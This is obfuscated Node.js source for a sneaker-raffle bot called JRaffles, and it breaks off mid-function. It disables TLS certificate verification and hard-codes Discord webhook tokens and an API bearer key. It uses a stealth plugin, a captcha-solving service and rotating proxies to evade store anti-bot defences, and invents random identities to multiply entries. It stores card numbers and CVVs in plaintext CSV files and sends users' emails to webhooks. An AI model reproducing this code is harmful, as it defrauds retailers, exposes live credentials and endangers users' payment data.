process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
var _0x91ddb5 = require('node-imap'), _0x2445c1 = require('util')['inspect'];
const _0x3631ef = require('mailparser')['simpleParser'], { EmbedBuilder: _0x217e00 } = require('discord.js');
var _0x1ebcc9 = require('exe');
const { execFile: _0x962685 } = require('child_process'), _0x4e5975 = require('puppeteer-extra'), _0x2e6420 = require('puppeteer-extra-plugin-recaptcha'), _0x10339b = require('puppeteer-extra-plugin-stealth'), _0x49dcd4 = require('chalk'), _0x535b9c = require('node-bash-title'), _0xd8dc96 = require('fs'), _0x44c468 = require('axios'), _0x1af1e8 = require('papaparse');
var _0x5e4320 = require('random-name');
const _0x5f4dd5 = require('request');
var _0x323b70 = require('prompt');
const _0x45e81e = _0x5f4dd5['jar']();
var _0x397a11 = {};
const _0x287746 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x351051 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0xc29770 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x2044ee = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x240790 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x5dce07 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x156a64 = 'https://discord.com/api/webhooks/', _0x554720 = '' + _0x156a64 + _0xc29770, _0x29936e = '' + _0x156a64 + _0x2044ee, _0x171351 = '' + _0x156a64 + _0x287746, _0x8997ff = '' + _0x156a64 + _0x351051, _0x3ebea8 = '' + _0x156a64 + _0x240790, _0x496075 = '' + _0x156a64 + _0x5dce07;
const _0x440dc4 = JSON['parse'](_0xd8dc96['readFileSync']('../package.json', 'utf-8')), _0x14595d = _0x440dc4['version'];
var _0x201f86, _0xa80a1d, _0x488930, _0x404e4e, _0x19b45d, _0x103738, _0x3b1bf1, _0x3e5e23;
const _0x185844 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0xb22f80 = ![];
const _0x4b9331 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x24e8eb = '0123456789';
var _0x4d1c2e = _0x4b9331['split']('');
const _0x40002e = require('auto-git-update'), { PageEmittedEvents: _0x5308ce } = require('puppeteer'), { getRandomValues: _0x55028c } = require('crypto'), { resolve: _0x1a08d1 } = require('path'), { Console: _0x2cf799 } = require('console'), _0x31a7df = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x450cc9 = new _0x40002e(_0x31a7df);
async function _0x3f0f91() {
    _0x19b45d = _0xd8dc96['readdirSync']('../proxies'), _0x404e4e = _0xd8dc96['readdirSync']('../tasks'), !_0xd8dc96['existsSync']('../accounts/fenom.csv') && _0xd8dc96['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0xd8dc96['existsSync']('../accounts/bstn.csv') && _0xd8dc96['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0xd8dc96['existsSync']('../accounts/eql.csv') && _0xd8dc96['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0xd8dc96['existsSync']('../failed-tasks.csv') && _0xd8dc96['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0xd8dc96['existsSync']('../successful-tasks.csv') && _0xd8dc96['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x397a11 = JSON['parse'](_0xd8dc96['readFileSync']('../settings.json', 'utf-8')), !_0x397a11['delay'] && (_0x397a11['delay'] = 0x3c, _0xd8dc96['writeFileSync']('../settings.json', JSON['stringify'](_0x397a11, null, 0x2))), !_0x397a11['masterMail'] && (_0x397a11['masterMail'] = 'yourmail@gmail.com', _0xd8dc96['writeFileSync']('../settings.json', JSON['stringify'](_0x397a11, null, 0x2))), !_0x397a11['masterPassword'] && (_0x397a11['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0xd8dc96['writeFileSync']('../settings.json', JSON['stringify'](_0x397a11, null, 0x2))), !_0x397a11['captchaKey'] && (_0x397a11['captchaKey'] = '', _0xd8dc96['writeFileSync']('../settings.json', JSON['stringify'](_0x397a11, null, 0x2))), !_0x397a11['useRandomProxy'] && (_0x397a11['useRandomProxy'] = !![], _0xd8dc96['writeFileSync']('../settings.json', JSON['stringify'](_0x397a11, null, 0x2))), !_0x397a11['shuffleTasks'] && (_0x397a11['shuffleTasks'] = ![], _0xd8dc96['writeFileSync']('../settings.json', JSON['stringify'](_0x397a11, null, 0x2))), !_0x397a11['webhook'] && (_0x397a11['webhook'] = '', _0xd8dc96['writeFileSync']('../settings.json', JSON['stringify'](_0x397a11, null, 0x2))), _0x397a11['delay'] <= 0x1388 && (_0x397a11['delay'] = _0x397a11['delay'] * 0x3e8), _0x397a11['AfewDelay'] && (delete _0x397a11['AfewDelay'], _0xd8dc96['writeFileSync']('../settings.json', JSON['stringify'](_0x397a11, null, 0x2))), _0x397a11['MahaDelay'] && (delete _0x397a11['MahaDelay'], _0xd8dc96['writeFileSync']('../settings.json', JSON['stringify'](_0x397a11, null, 0x2))), _0x397a11['footshopDelay'] && (delete _0x397a11['footshopDelay'], _0xd8dc96['writeFileSync']('../settings.json', JSON['stringify'](_0x397a11, null, 0x2))), _0x397a11['MahaDelay'] = _0x397a11['delay'], _0x156a64 = _0x397a11['webhook'], _0x103738 = _0x397a11['licenseKey'];
}
let _0x27edcd, _0x346456 = [], _0xfc47a4;
const _0x2bc7d2 = _0x43e76d => new Promise(_0x31bdfc => setTimeout(_0x31bdfc, _0x43e76d));
function _0xeb0183(_0x495f3c, _0x35f591) {
    return Math['floor'](Math['random']() * (_0x35f591 - _0x495f3c + 0x1) + _0x495f3c);
}
function _0x437415(_0x43d20b) {
    let _0x41792b = _0x43d20b['length'], _0x440538;
    while (_0x41792b != 0x0) {
        _0x440538 = Math['floor'](Math['random']() * _0x41792b), _0x41792b--, [_0x43d20b[_0x41792b], _0x43d20b[_0x440538]] = [
            _0x43d20b[_0x440538],
            _0x43d20b[_0x41792b]
        ];
    }
    return _0x43d20b;
}
async function _0x515ef9(_0x32fc69) {
    return _0x44c468['get']('https://api.hyper.co/v4/licenses/' + _0x32fc69, { 'headers': { 'Authorization': 'Bearer\x20' + _0x185844 } })['then'](_0x221440 => _0x221440['data'])['catch'](() => null);
}
;
async function _0x340225(_0x36d996) {
    console['clear']();
    if (_0x36d996 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0xaa5ed1 = await _0x323b70['get']('License');
        if (_0xaa5ed1['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x2bc7d2(0xbb8), _0x340225(_0x36d996);
        _0x36d996 = _0xaa5ed1['License'], _0x397a11['licenseKey'] = _0x36d996, _0x103738 = _0x36d996, _0xd8dc96['writeFileSync']('../settings.json', JSON['stringify'](_0x397a11));
    }
    console['log']('Checking\x20license\x20' + _0x103738 + '...'), await _0x2bc7d2(0x320);
    const _0x1a9d64 = await _0x515ef9(_0x36d996);
    _0x3b1bf1 = JSON['stringify'](_0x1a9d64['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x3e5e23 = JSON['stringify'](_0x1a9d64['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x1a9d64)
        return console['log']('License\x20not\x20found');
    if (!_0x1a9d64['user'])
        return console['log']('License\x20not\x20bound');
    return _0x1a9d64['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0xb22f80 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0xb22f80 = ![]);
}
async function _0x5d6e01() {
    var _0x39dbf0 = await _0x323b70['get']('Module');
    return console['clear'](), _0x39dbf0['Module'];
}
;
async function _0x2cc4a8() {
    var _0x23ea06 = await _0x323b70['get']('Setting');
    return console['clear'](), _0x23ea06['Setting'];
}
async function _0x3e65db() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0xb98462 = 0x0; _0xb98462 < _0x404e4e['length']; _0xb98462++) {
        console['log']('\x20(' + _0xb98462 + ')\x20' + _0x404e4e[_0xb98462]);
    }
    console['log']('');
    var _0x43442e = await _0x323b70['get']('Task');
    if (_0x43442e['Task'] > _0x404e4e['length'] - 0x1 || isNaN(_0x43442e['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x2bc7d2(0x3e8), _0x3e65db();
    var _0x582bc4 = _0xd8dc96['readFileSync']('../tasks/' + _0x404e4e[_0x43442e['Task']], 'utf-8');
    return _0x488930 = _0x1af1e8['parse'](_0x582bc4, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x49dcd4['blue'](_0x404e4e[_0x43442e['Task']])), _0x201f86 = _0x404e4e[_0x43442e['Task']], _0x488930;
}
async function _0x16395f() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x58ceb8 = 0x0; _0x58ceb8 < _0x19b45d['length']; _0x58ceb8++) {
        console['log']('\x20(' + _0x58ceb8 + ')\x20' + _0x19b45d[_0x58ceb8]);
    }
    console['log']('');
    var _0x581a22 = await _0x323b70['get']('Proxies');
    if (_0x581a22['Proxies'] > _0x19b45d['length'] - 0x1 || isNaN(_0x581a22['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x2bc7d2(0x3e8), _0x16395f();
    var _0x53d962 = _0xd8dc96['readFileSync']('../proxies/' + _0x19b45d[_0x581a22['Proxies']], 'utf-8')['split']('\x0a');
    let _0x390a79 = _0x53d962['map']((_0x566635, _0x3c000b) => {
        sanatizeProxy = _0x566635['replace']('\x0d', '');
        if (_0x53d962[_0x3c000b + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0xa80a1d = _0x19b45d[_0x581a22['Proxies']], console['clear'](), _0x390a79;
}
async function _0x50f388() {
    var _0x1e7d69 = await _0x323b70['get']('Value');
    return console['clear'](), _0x1e7d69['Value'];
}
async function _0x29daf7(_0x2618f5) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0xa91b3e = 0x0; _0xa91b3e < _0x2618f5['length']; _0xa91b3e++) {
        console['log']('\x20(' + _0xa91b3e + ')\x20[' + _0x2618f5[_0xa91b3e]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x18e71e = await _0x323b70['get']('Module');
    return _0x18e71e['Module'];
}
async function _0x2e6414() {
    var _0x324df3 = await _0x323b70['get']('Password');
    return console['clear'](), _0x324df3['Password'];
}
;
async function _0x9b905a() {
    var _0x5d2f8f = await _0x323b70['get']('Links');
    return _0x5d2f8f['Links'];
}
;
async function _0x2fe27b() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x150e83 = 0x0; _0x150e83 < _0x346456['length']; _0x150e83++) {
        console['log']('\x20(' + _0x150e83 + ')\x20' + _0x346456[_0x150e83]);
    }
    ;
    console['log']();
    let _0x4d4e97 = await _0x323b70['get']('Product');
    return console['clear'](), _0x4d4e97['Product'];
}
;
function _0x207f7e() {
    var _0x1c2825 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x1c2825;
}
;
function _0x3186ff() {
    var _0x42de1e = new Date(Date['now']())['toLocaleString']();
    return _0x42de1e['replace'](',', '');
}
async function _0x5e696c(_0x432127, _0x5a7df1) {
    let _0x47e8ed = { 'headers': { 'content-type': 'application/json' } };
    if (_0x14595d != 'devkey') {
        await _0x44c468['post'](_0x432127, _0x5a7df1, _0x47e8ed);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x1487ea(_0x1c91f7, _0x31a304, _0x492493, _0x46a8a2, _0x4d7196) {
    if (!_0x46a8a2 && _0x492493 == 'dev') {
        var _0x2e1fec = new _0x217e00()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x31a304['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x31a304['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x1c91f7['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x397a11['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x3b1bf1,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x1c91f7['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x1c91f7['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x14595d,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x2e1fec['data'];
    } else {
        if (_0x46a8a2 && _0x492493 == 'dev') {
            var _0x2e1fec = new _0x217e00()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x31a304['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x3b1bf1,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x31a304['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x1c91f7['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x397a11['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x4d7196,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x1c91f7['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x1c91f7['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x14595d,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x2e1fec['data'];
        } else {
            if (_0x492493 == 'pub') {
                var _0x2e1fec = new _0x217e00()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x31a304['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x31a304['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x1c91f7['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x397a11['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x1c91f7['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x14595d,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x2e1fec['data'];
            } else {
                if (_0x492493 == 'acc' && !_0x46a8a2) {
                    var _0x2e1fec = new _0x217e00()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x31a304['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x3b1bf1,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x31a304['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x397a11['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x14595d,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x2e1fec['data'];
                } else {
                    if (_0x492493 == 'acc' && _0x46a8a2) {
                        var _0x2e1fec = new _0x217e00()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x31a304['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x3b1bf1,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x4d7196,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x31a304['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x397a11['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x14595d,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x2e1fec['data'];
                    } else {
                        if (_0x492493 == 'open') {
                            var _0x2e1fec = new _0x217e00()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x3e5e23)['addFields']({
                                'name': 'User',
                                'value': '' + _0x3b1bf1,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x14595d,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x2e1fec['data'];
                        } else {
                            if (!_0x46a8a2 && _0x492493 == 'ver') {
                                var _0x2e1fec = new _0x217e00()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x31a304['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x3b1bf1,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x31a304['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x397a11['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x14595d,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x2e1fec['data'];
                            } else {
                                if (_0x46a8a2 && _0x492493 == 'ver') {
                                    var _0x2e1fec = new _0x217e00()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x31a304['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x3b1bf1,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x4d7196,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x31a304['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x397a11['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x14595d,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x2e1fec['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x38eff1(_0x19127e, _0x4d95b9) {
    var _0x15a2a6 = _0x19127e[_0x4d95b9]['Address1']['split'](''), _0x415bf0 = _0x19127e[_0x4d95b9]['Address2']['split'](''), _0x2f4833 = _0x19127e[_0x4d95b9]['Email']['split']('@');
    for (var _0x3600b0 = 0x0; _0x3600b0 < _0x15a2a6['length']; _0x3600b0++) {
        if (_0x15a2a6[_0x3600b0] == 'X') {
            var _0x1c7737 = Math['round'](Math['random']() * (_0x4b9331['length'] - 0x1));
            _0x15a2a6[_0x3600b0] = _0x4d1c2e[_0x1c7737];
        }
    }
    ;
    for (var _0x3600b0 = 0x0; _0x3600b0 < _0x415bf0['length']; _0x3600b0++) {
        if (_0x415bf0[_0x3600b0] == 'X') {
            var _0x1c7737 = Math['round'](Math['random']() * (_0x4b9331['length'] - 0x1));
            _0x415bf0[_0x3600b0] = _0x4d1c2e[_0x1c7737];
        }
    }
    ;
    _0x19127e[_0x4d95b9]['FirstName'] == 'RANDOM' && (_0x19127e[_0x4d95b9]['FirstName'] = _0x5e4320['first']());
    _0x19127e[_0x4d95b9]['LastName'] == 'RANDOM' && (_0x19127e[_0x4d95b9]['LastName'] = _0x5e4320['last']());
    _0x2f4833[0x0] == 'RANDOM' ? _0x2f4833[0x0] = '' + _0x5e4320['first']() + _0x5e4320['last']() + _0xeb0183(0x1, 0x270f) + '@' : _0x2f4833[0x0] = _0x2f4833[0x0] + '@';
    _0x19127e[_0x4d95b9]['Email'] = _0x2f4833['join'](''), _0x19127e[_0x4d95b9]['Address1'] = _0x15a2a6['join'](''), _0x19127e[_0x4d95b9]['Address2'] = _0x415bf0['join']('');
    _0x19127e[_0x4d95b9]['Phone'] == 'RANDOM' && (_0x19127e[_0x4d95b9]['Phone'] = '0' + _0xeb0183(0x5f5e100, 0x3b9ac9ff));
    if (_0x19127e[_0x4d95b9]['Follower'] == 'RANDOM') {
        var _0x53f019 = _0xeb0183(0x1, 0x270f);
        _0x19127e[_0x4d95b9]['Follower'] = '' + _0x5e4320['first']() + _0x5e4320['last']() + _0x53f019 + '\x20';
    }
    _0x19127e[_0x4d95b9]['HouseNumber'] == 'RANDOM' && (_0x19127e[_0x4d95b9]['HouseNumber'] = _0xeb0183(0x1, 0xc8));
    if (_0x19127e[_0x4d95b9]['Address1'] == 'RANDOM') {
        var _0x8d8f38 = Math['round'](Math['random']() * (_0x4b9331['length'] - 0x1)), _0x38e196 = _0x4d1c2e[_0x8d8f38];
        _0x19127e[_0x4d95b9]['Address1'] = _0x5e4320['last']() + 'straat', _0x19127e[_0x4d95b9]['Zip'] == '' && (_0x19127e[_0x4d95b9]['Postcode'] = _0xeb0183(0x3e8, 0x270f) + '\x20' + _0x38e196 + _0x38e196, _0x19127e[_0x4d95b9]['Zip'] = _0x19127e[_0x4d95b9]['Postcode']), _0x19127e[_0x4d95b9]['HouseNumber'] = '' + _0xeb0183(0x1, 0xc8);
    }
    return;
}
;
async function _0x4b302f(_0x2c4207, _0x1149be) {
    _0xd8dc96['appendFileSync']('../failed-tasks.csv', _0x3186ff() + ',' + _0x1149be['store'] + ',' + _0x1149be['name'] + ',' + _0x2c4207['Url'] + ',' + _0x2c4207['Size'] + ',' + _0x2c4207['Follower'] + ',' + _0x2c4207['FirstName'] + ',' + _0x2c4207['LastName'] + ',' + _0x2c4207['Address1'] + ',' + _0x2c4207['Address2'] + ',' + _0x2c4207['HouseNumber'] + ',' + _0x2c4207['Zip'] + ',' + _0x2c4207['City'] + ',' + _0x2c4207['State'] + ',' + _0x2c4207['Country'] + ',' + _0x2c4207['Phone'] + ',' + _0x2c4207['Email'] + ',' + _0x2c4207['Password'] + ',' + _0x2c4207['PaymentMethod'] + ',' + _0x2c4207['CardType'] + ',' + _0x2c4207['NameOnCard'] + ',' + _0x2c4207['CardNumber'] + ',' + _0x2c4207['ExpiryDate'] + ',' + _0x2c4207['CVV'] + ',' + _0x2c4207['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x1560d5(_0x4a722b, _0x5963ae) {
    _0xd8dc96['appendFileSync']('../successful-tasks.csv', _0x3186ff() + ',' + _0x5963ae['store'] + ',' + _0x5963ae['name'] + ',' + _0x4a722b['Url'] + ',' + _0x4a722b['Size'] + ',' + _0x4a722b['Follower'] + ',' + _0x4a722b['FirstName'] + ',' + _0x4a722b['LastName'] + ',' + _0x4a722b['Address1'] + ',' + _0x4a722b['Address2'] + ',' + _0x4a722b['HouseNumber'] + ',' + _0x4a722b['Zip'] + ',' + _0x4a722b['City'] + ',' + _0x4a722b['State'] + ',' + _0x4a722b['Country'] + ',' + _0x4a722b['Phone'] + ',' + _0x4a722b['Email'] + ',' + _0x4a722b['Password'] + ',' + _0x4a722b['PaymentMethod'] + ',' + _0x4a722b['CardType'] + ',' + _0x4a722b['NameOnCard'] + ',' + _0x4a722b['CardNumber'] + ',' + _0x4a722b['ExpiryDate'] + ',' + _0x4a722b['CVV'] + ',' + _0x4a722b['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x447535() {
    let _0x819da9 = proxyFile['split']('\x0a'), _0x30ce72 = _0x819da9['map']((_0x4a0457, _0x2eddf2) => {
        sanatizeProxy = _0x4a0457['replace']('\x0d', '');
        if (_0x819da9[_0x2eddf2 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x30ce72;
}
;
async function _0x10f4bd(_0x4928ec) {
    var _0x32993c = _0x4928ec[0x1]['split'](':');
    const _0x58c4eb = await _0x4e5975['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x32993c[0x0] + ':' + _0x32993c[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x3bbedd = await _0x58c4eb['newPage']();
        await _0x3bbedd['authenticate']({
            'username': '' + _0x32993c[0x2],
            'password': '' + _0x32993c[0x3]
        }), console['log'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x3bbedd['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3bbedd['setRequestInterception'](!![]), _0x3bbedd['on']('request', _0xba45f8 => {
            _0xba45f8['resourceType']() === 'image' || _0xba45f8['resourceType']() === 'font' || _0xba45f8['resourceType']() === 'media' ? _0xba45f8['abort']() : _0xba45f8['continue']();
        }), await _0x3bbedd['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x207f7e() + '\x20[' + _0x3b60fe[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x3bbedd['waitForTimeout'](0xbb8), await _0x3bbedd['waitForSelector']('.product-card');
        const _0x2d5967 = await _0x3bbedd['$$eval']('a.product-card', _0x502889 => {
            return _0x502889['map'](_0x234c7d => _0x234c7d['href']);
        });
        return _0x346456 = _0x2d5967;
    } catch (_0x1963c9) {
        console['log']('\x20' + _0x1963c9);
    } finally {
        _0x58c4eb['close'](), console['clear']();
    }
}
;
async function _0x470e4e(_0x3e7390, _0x5d9978) {
    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x397a11['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xd41e29 = 0x0; _0xd41e29 < bouncewear['length']; _0xd41e29++) {
        await _0x38eff1(bouncewear, _0xd41e29);
        if (bouncewear[_0xd41e29]['Email'] == '' || bouncewear[_0xd41e29]['Password'] == '' || bouncewear[_0xd41e29]['FirstName'] == '' || bouncewear[_0xd41e29]['LastName'] == '') {
